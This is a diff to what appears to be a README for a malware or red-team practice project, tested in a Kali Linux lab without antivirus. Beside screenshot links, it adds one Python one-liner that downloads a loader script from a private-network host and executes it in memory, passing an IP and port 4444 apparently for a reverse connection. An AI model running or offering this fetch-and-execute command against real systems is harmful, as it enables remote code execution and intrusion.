@@ -11,6 +11,7 @@ This was test on Kali Linux with no AnitVirus or EDR. The goal was to practice r
 
 <img width="889" height="504" alt="image" src="https://github.com/user-attachments/assets/ce4fb7de-48e4-4066-9b4a-f27daf0f7b46" />
 
+python3 -c "import urllib.request, sys; sys.argv = ['loader.py', '172.26.130.102', '4444']; exec(urllib.request.urlopen('http://172.26.130.102:80/loader.py').read())"
 <img width="1366" height="511" alt="image" src="https://github.com/user-attachments/assets/a0064a47-d3ea-496d-b85f-d9a9dc12fb92" />
 
 <img width="1376" height="514" alt="image" src="https://github.com/user-attachments/assets/a4003e67-a89e-4cfa-b7fb-2905d271f970" />
